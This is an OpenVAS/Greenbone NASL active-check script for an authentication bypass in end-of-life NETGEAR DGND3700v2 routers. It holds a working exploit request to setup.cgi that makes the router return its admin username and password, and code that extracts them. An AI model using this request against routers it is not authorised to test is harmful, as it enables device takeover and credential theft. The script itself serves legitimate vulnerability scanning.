# Copyright (C) 2022 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/o:netgear:dgnd3700_firmware";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.147818");
  script_version("2022-03-21T12:37:45+0000");
  script_tag(name:"last_modification", value:"2022-03-22 11:26:02 +0000 (Tue, 22 Mar 2022)");
  script_tag(name:"creation_date", value:"2022-03-21 07:03:32 +0000 (Mon, 21 Mar 2022)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("NETGEAR DGND3700v2 Multiple Vulnerabilities (PSV-2021-0343) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2022 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_netgear_dgnd3700_http_detect.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("netgear/dgnd3700/http/detected");

  script_tag(name:"summary", value:"NETGEAR DGN3700v2 devices are prone to multiple
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  - Authentication bypass

  - Arbitrary command execution");

  script_tag(name:"affected", value:"NETGEAR DGND3700v2 devices are known to be affected.");

  script_tag(name:"solution", value:"No solution was made available by the vendor.

  Note: NETGEAR will not release a fix for this vulnerability on the affected product as the
  product is outside of the security support period. Current in-support models are not affected by
  this vulnerability.");

  script_xref(name:"URL", value:"https://kb.netgear.com/000064688/Security-Advisory-for-Authentication-Bypass-on-the-DGND3700v2-PSV-2021-0343");
  script_xref(name:"URL", value:"https://ssd-disclosure.com/ssd-advisory-netgear-dgnd3700v2-preauth-root-access/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm";

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

if ("You have successfully recovered the admin password." >< res && "Router Admin Password" >< res) {
  report = 'It was possible to obtain the admin credentials at ' +
           http_report_vuln_url(port: port, url: url, url_only: TRUE) + '\n\nResult:\n\n';

  user = eregmatch(pattern: "Router Admin Username</span>:[^;]+;([^<]+)<", string: res);
  pass = eregmatch(pattern: "Router Admin Password</span>:[^;]+;([^<]+)<", string: res);

  report += 'Admin Username: ' + user[1] + '\n';
  report += 'Admin Password: ' + pass[1];

  security_message(port: port, data: report);
  exit(0);
}

exit(99);
